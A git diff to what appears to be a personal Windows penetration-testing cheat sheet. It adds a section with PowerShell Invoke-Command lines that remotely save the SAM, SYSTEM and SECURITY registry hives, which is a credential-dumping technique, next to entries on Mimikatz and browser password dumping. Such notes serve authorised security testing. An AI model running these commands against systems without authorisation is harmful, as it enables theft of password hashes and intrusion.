@@ -108,6 +108,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-run-seatbelt-absolutely-must">Run Seatbelt (ABSOLUTELY MUST)</a>
       * <a href="#-dump-creds">Dump Creds</a>
       * <a href="#-dump-creds-2">Dump Creds #2</a>
+      * <a href="#-dump-creds-2">Dump SAM Remotely over WinRM</a>
       * <a href="#-running-mimikatz-with-gadgettojscript-or-vbs">Running MimiKatz with JScript or VBS</a>
       * <a href="#-sessiongopher">SessionGohper</a>
       * <a href="#-dump-chrome-passwords-also-post-exploit-1">Dump Chrome Passwords (Also Post Exploit)</a>
@@ -1681,6 +1682,20 @@ laZagne.exe browsers -firefox
 
 ```
 
+
+
+#### [](#header-4) Dump SAM Remotely with WinRM
+
+```powershell
+
+Invoke-Command -ComputerName m0chan -Credential $cred -ScriptBlock {reg save hklm\sam c:\temp\sam.save}
+
+Invoke-Command -ComputerName m0chan -Credential $cred -ScriptBlock {reg save hklm\system c:\temp\system.save}
+
+Invoke-Command -ComputerName m0chan -Credential $cred -ScriptBlock {reg save hklm\security c:\temp\security.save}
+
+
+```
 
 
 #### [](#header-4) Running Mimikatz with GadgetToJScript or VBS
